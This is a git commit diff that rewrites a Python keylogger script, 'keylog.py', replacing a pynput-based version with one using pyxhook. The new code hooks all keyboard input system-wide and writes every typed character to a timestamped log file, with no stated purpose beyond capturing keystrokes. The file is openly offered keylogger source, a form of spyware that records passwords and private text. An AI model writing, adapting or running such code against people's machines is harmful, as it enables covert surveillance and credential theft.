89a42fe9bcf610c2761924dc746bb0599b635b7e
Jeevan25042006 <147309031+Jeevan25042006@users.noreply.github.com>
2024-08-21 23:39:26 +0530

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,17 +1,40 @@
-import pynput.keyboard
+# import needed modules
+import os
+from datetime import datetime
+import pyxhook
 
-def on_press(key):
+def main():
+    # Specify the name of the file (can be changed )
+    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
+
+    # The logging function with {event parm}
+    def OnKeyPress(event):
+
+        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
+            if event.Key == 'P_Enter' :
+                f.write('\n')
+            else:
+                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters
+
+    # Create a hook manager object
+    new_hook = pyxhook.HookManager()
+    new_hook.KeyDown = OnKeyPress
+
+    new_hook.HookKeyboard()  # set the hook
+
     try:
-        key_str = str(key.char)
-    except AttributeError:
-        key_str = str(key)
-    with open("keylog.txt", "a") as f:
-        f.write(key_str)
+        new_hook.start()  # start the hook
+    except KeyboardInterrupt:
+        # User cancelled from command line so close the listener
+        new_hook.cancel()
+        pass
+    except Exception as ex:
+        # Write exceptions to the log file, for analysis later.
+        msg = f"Error while catching events:\n  {ex}"
+        pyxhook.print_err(msg)
+        with open(log_file, "a") as f:
+            f.write(f"\n{msg}")
 
-def on_release(key):
-    if key == pynput.keyboard.Key.esc:
-        return False
 
-with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-# This script will log all the keys pressed on the keyboard and save them to a file called keylog.txt
+if __name__ == "__main__":
+    main()
